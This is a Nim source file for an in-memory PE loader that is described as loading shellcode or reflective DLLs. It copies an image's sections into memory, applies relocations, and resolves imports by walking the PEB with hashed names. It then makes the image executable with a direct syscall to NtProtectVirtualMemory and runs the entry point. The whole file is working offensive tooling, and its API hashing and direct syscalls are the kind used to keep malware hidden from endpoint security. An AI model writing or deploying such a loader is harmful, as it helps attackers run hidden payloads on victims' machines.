# loader.nim — in-memory PE loader (shellcode / reflective DLL)
#
# load_pe(buf) maps a PE image into an executable allocation,
# applies relocations, resolves imports via PEB walk, then calls entry point.

import winim
import syscall

const CURRENT_PROCESS = cast[HANDLE](uint(high(int)))  # NtCurrentProcess pseudo-handle

proc loadPe*(buf: seq[byte]): bool =
  # unsafe
  if buf.len < 64: return false

  let bp  = cast[uint](unsafeAddr buf[0])
  let dos = cast[ptr IMAGE_DOS_HEADER](bp)
  if dos[].e_magic != 0x5A4D'u16: return false  # MZ

  let ntOff  = uint(dos[].e_lfanew)
  let nt     = cast[ptr IMAGE_NT_HEADERS64](bp + ntOff)
  let opt    = addr nt[].OptionalHeader
  let imgSz  = uint(opt[].SizeOfImage)
  let hdrSz  = uint(opt[].SizeOfHeaders)

  # Allocate memory for the image
  let base = VirtualAlloc(nil, SIZE_T(imgSz), MEM_COMMIT or MEM_RESERVE,
                          PAGE_READWRITE)
  if base == nil: return false
  let baseu = cast[uint](base)

  # Copy headers
  copyMem(base, unsafeAddr buf[0], int(hdrSz))

  # Copy sections
  let nSections = int(nt[].FileHeader.NumberOfSections)
  let secPtr = cast[ptr IMAGE_SECTION_HEADER](
    bp + ntOff + 4 + uint(sizeof(IMAGE_FILE_HEADER)) +
    uint(nt[].FileHeader.SizeOfOptionalHeader))

  for i in 0 ..< nSections:
    let sec    = cast[ptr IMAGE_SECTION_HEADER](
                   cast[uint](secPtr) + uint(i) * uint(sizeof(IMAGE_SECTION_HEADER)))
    let rawOff = uint(sec[].PointerToRawData)
    let rawSz  = uint(sec[].SizeOfRawData)
    let virtOff= uint(sec[].VirtualAddress)
    if rawSz == 0: continue
    copyMem(cast[pointer](baseu + virtOff),
            cast[pointer](bp + rawOff), int(rawSz))

  # Base relocations
  let relocRva = uint(opt[].DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
  if relocRva != 0:
    let delta   = int64(baseu) - int64(opt[].ImageBase)
    var relocPtr = baseu + relocRva
    while true:
      let blockSize = uint(cast[ptr uint32](relocPtr + 4)[])
      if blockSize < uint(sizeof(uint32) * 2): break
      let pageRva  = uint(cast[ptr uint32](relocPtr)[])
      let nEntries = int((blockSize - 8) div 2)
      let entries  = cast[ptr uint16](relocPtr + 8)
      for j in 0 ..< nEntries:
        let entry  = cast[ptr uint16](cast[uint](entries) + uint(j) * 2)[]
        let t      = entry shr 12
        if t == 0xA'u16:  # IMAGE_REL_BASED_DIR64
          let offset = uint(entry and 0xFFF'u16)
          let patch  = cast[ptr int64](baseu + pageRva + offset)
          patch[] = int64(uint64(patch[]) + uint64(delta))
      relocPtr += blockSize

  # Import resolution
  let impRva = uint(opt[].DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
  if impRva != 0:
    var desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](baseu + impRva)
    while desc[].Name != 0:
      let modName = cast[ptr byte](baseu + uint(desc[].Name))
      var mh: uint32 = 5381
      var k = 0
      while true:
        let b = cast[ptr byte](cast[uint](modName) + uint(k))[]
        if b == 0: break
        let lc = if b >= byte('A') and b <= byte('Z'): b + 32 else: b
        mh = mh * 33 + uint32(lc)
        inc k

      let thunkRva = uint(desc[].OriginalFirstThunk)
      let iatRva   = uint(desc[].FirstThunk)
      var iOff: uint = 0
      while true:
        let orig = cast[ptr uint](baseu + thunkRva + iOff)[]
        if orig == 0: break
        let fnNamePtr = cast[ptr byte](baseu + (orig and 0x7FFF_FFFF_FFFF_FFFF'u) + 2)
        var fh: uint32 = 5381
        var m = 0
        while true:
          let b = cast[ptr byte](cast[uint](fnNamePtr) + uint(m))[]
          if b == 0: break
          fh = fh * 33 + uint32(b)
          inc m
        let p = getProcFromPeb(mh, fh)
        let iatSlot = cast[ptr uint](baseu + iatRva + iOff)
        iatSlot[] = cast[uint](p)
        iOff += 8
      desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[uint](desc) + uint(sizeof(IMAGE_IMPORT_DESCRIPTOR)))

  # Mark image executable via NtProtectVirtualMemory
  let ssnProt = resolveSsn("NtProtectVirtualMemory")
  if ssnProt == 0: return false
  var protBase = baseu
  var protSize = imgSz
  var oldProt: uint32 = 0
  discard doSyscall(
    ssnProt,
    cast[uint](CURRENT_PROCESS),
    cast[uint](addr protBase),
    cast[uint](addr protSize),
    uint(PAGE_EXECUTE_READ),
    cast[uint](addr oldProt),
    0)

  # Call entry point
  let epRva = uint(opt[].AddressOfEntryPoint)
  if epRva == 0: return true
  let entry = cast[proc(base: uint, reason: uint32, reserved: uint): uint32 {.stdcall.}](
    baseu + epRva)
  discard entry(baseu, 1, 0)
  true
